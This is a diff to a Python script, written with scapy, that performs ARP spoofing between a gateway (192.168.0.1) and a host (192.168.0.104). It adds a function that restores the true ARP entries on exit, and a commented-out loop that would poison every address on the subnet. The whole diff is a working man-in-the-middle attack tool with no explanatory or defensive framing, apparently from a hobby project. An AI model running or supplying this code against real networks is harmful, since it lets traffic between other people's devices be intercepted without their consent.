@@ -2,6 +2,12 @@
 
 import scapy.all as scapy
 
+def restore(destination_ip, source_ip):
+	target_mac = get_target_mac(destination_ip)
+	source_mac = get_target_mac(source_ip)
+	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
+	scapy.send(packet, verbose=False)
+
 def get_target_mac(ip):
 	arp_request = scapy.ARP(pdst=ip)
 	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -18,9 +24,13 @@ def spoof_arp(target_ip,spoofed_ip):
 def main():
 	try:
 		while True:
+		#	for i in range(1,255):
+			#	spoof_arp("192.168.0."+str(i),"192.168.0.104")
 			spoof_arp("192.168.0.1","192.168.0.104")
 			spoof_arp("192.168.0.104","192.168.0.1")
 	except KeyboardInterrupt:
+		restore("192.168.0.1","192.168.0.104")
+		restore("192.168.0.104","192.168.0.1")
 		exit(0)
 
 main()
